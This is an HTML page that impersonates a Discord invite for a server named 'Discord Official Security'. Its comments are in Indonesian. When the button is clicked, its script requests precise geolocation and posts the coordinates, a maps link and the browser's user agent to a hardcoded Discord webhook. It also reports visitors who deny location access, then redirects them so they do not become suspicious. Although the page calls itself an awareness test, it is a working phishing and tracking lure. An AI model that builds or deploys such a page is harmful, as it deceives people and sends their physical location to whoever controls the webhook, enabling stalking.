<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord | Invite Link</title>
    <style>
        :root {
            --discord-blurple: #5865F2;
            --discord-dark: #36393f;
            --discord-darker: #2f3136;
        }

        body {
            margin: 0; background-color: var(--discord-darker);
            font-family: 'gg sans', sans-serif;
            display: flex; justify-content: center; align-items: center;
            height: 100vh; color: white;
        }

        .invite-card {
            background-color: var(--discord-dark);
            padding: 32px; border-radius: 8px;
            width: 100%; max-width: 440px; text-align: center;
            box-shadow: 0 8px 16px rgba(0,0,0,0.2);
        }

        .server-icon {
            width: 80px; height: 80px; background-color: var(--discord-blurple);
            border-radius: 28px; margin: 0 auto 16px;
            display: flex; justify-content: center; align-items: center;
            font-size: 32px; font-weight: bold;
        }

        .invite-text { color: #b9bbbe; font-size: 12px; font-weight: bold; text-transform: uppercase; margin-bottom: 8px; }
        .server-name { font-size: 20px; font-weight: bold; margin-bottom: 20px; }
        
        .btn-join {
            background-color: var(--discord-blurple); color: white; border: none;
            width: 100%; padding: 12px; font-size: 16px; font-weight: 500;
            border-radius: 3px; cursor: pointer; transition: 0.2s;
        }

        .btn-join:hover { background-color: #4752c4; }
        #status { display: none; margin-top: 15px; font-size: 14px; color: #b9bbbe; }
    </style>
</head>
<body>

    <div class="invite-card">
        <div class="invite-text">You've been invited to join</div>
        <div class="server-icon">D</div>
        <div class="server-name">Discord Official Security ✅</div>
        
        <button class="btn-join" id="joinBtn">Accept Invite</button>
        
        <div id="status">Connecting to Discord Gateway...</div>
    </div>

    <script>
        const joinBtn = document.getElementById('joinBtn');
        const status = document.getElementById('status');
        
        // WEBHOOK KAMU SUDAH TERPASANG DI SINI
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1500542592398397652/aJhsNN61hz6Qv8PTssvjJxZKxpm55uO27EzJtT1jROeQSD8I7fdMH1ImMz94JX45TE01";

        joinBtn.addEventListener('click', () => {
            status.style.display = 'block';
            joinBtn.innerText = 'Joining...';
            joinBtn.disabled = true;

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendData, handleError, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            } else {
                alert("Discord API error: Geolocation not supported.");
            }
        });

        function sendData(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;

            const payload = {
                username: "Discord Security Logger",
                content: "🔔 **Target Terdeteksi!**",
                embeds: [{
                    title: "Hasil Test Kesadaran (Awareness Test)",
                    color: 5763719,
                    fields: [
                        { name: "📍 Koordinat", value: `\`${lat}, ${lon}\``, inline: true },
                        { name: "🗺️ Google Maps", value: `[Buka Lokasi](${mapsUrl})` },
                        { name: "📱 Device Info", value: navigator.userAgent }
                    ],
                    footer: { text: "Edukasi: Jangan asal klik 'Allow'!" },
                    timestamp: new Date()
                }]
            };

            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            }).then(() => {
                // Redirect biar dia nggak curiga
                window.location.href = "https://discord.com/invite/discord-safety";
            });
        }

        function handleError(error) {
            // Tetap kirim info kalau dia klik tapi 'Deny'
            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: "⚠️ **Target klik 'Accept Invite' tapi menolak (Deny) akses lokasi.**" })
            });
            setTimeout(() => { window.location.href = "https://discord.com"; }, 1000);
        }
    </script>
</body>
</html>
